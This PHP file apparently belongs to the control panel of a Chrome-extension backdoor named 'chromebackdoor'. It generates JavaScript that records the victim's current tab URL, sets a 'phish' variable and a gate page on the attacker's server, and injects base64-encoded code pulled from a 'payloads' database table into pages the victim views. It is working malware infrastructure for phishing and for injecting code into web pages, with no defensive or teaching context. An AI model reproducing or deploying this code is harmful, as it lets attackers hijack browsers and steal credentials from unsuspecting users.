<?php
require_once('includes/config.php');
?>
$(document).ready(function()
{
    var phish = "";
    var tabURL = window.location.href;
    
    var server_web = 'http://localhost:8888/taff/private/chromebackdoor/'
 var gate_page = 'web/show.php'
    
    <?php
    $select_url_check = $bdd->prepare("SELECT urlverif FROM payloads");
    $select_url_check->execute();
    while($fetch = $select_url_check->fetch())
    {
        $url_verif = $fetch['urlverif'];
        echo base64_decode($url_verif);
    }
    
    $select_inject_check = $bdd->prepare("SELECT codeinject FROM payloads");
    $select_inject_check->execute();
    while($fetch2 = $select_inject_check->fetch())
    {
        $inject = $fetch2['codeinject'];
        echo base64_decode($inject);
    }
    ?>
});